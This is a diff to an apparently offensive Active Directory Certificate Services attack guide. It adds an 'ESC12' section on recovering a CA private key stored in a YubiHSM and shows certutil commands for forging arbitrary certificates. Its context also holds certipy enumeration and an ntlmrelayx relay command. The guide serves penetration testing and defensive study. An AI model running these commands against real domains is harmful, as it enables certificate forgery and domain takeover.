@@ -621,7 +621,6 @@ You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disab
 
 ```bash
 $ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
-
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 Certificate Authorities
@@ -668,6 +667,33 @@ Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
 $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
 ```
 
+## Shell access to ADCS CA with YubiHSM - ESC12
+
+### Explanation
+
+Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".
+
+If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.
+
+This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.
+
+Everything is explained [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
+
+### Abuse Scenario
+
+If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.
+
+In frist, you should obtain the CA certificate, it is public: 
+
+```cmd
+# import it to the user store with CA certificate
+$ certutil -addstore -user my <CA certificate file>
+
+# Associated with the private key in the YubiHSM2 device
+$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
+```
+
+Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.
 
 ## Compromising Forests with Certificates Explained in Passive Voice
 
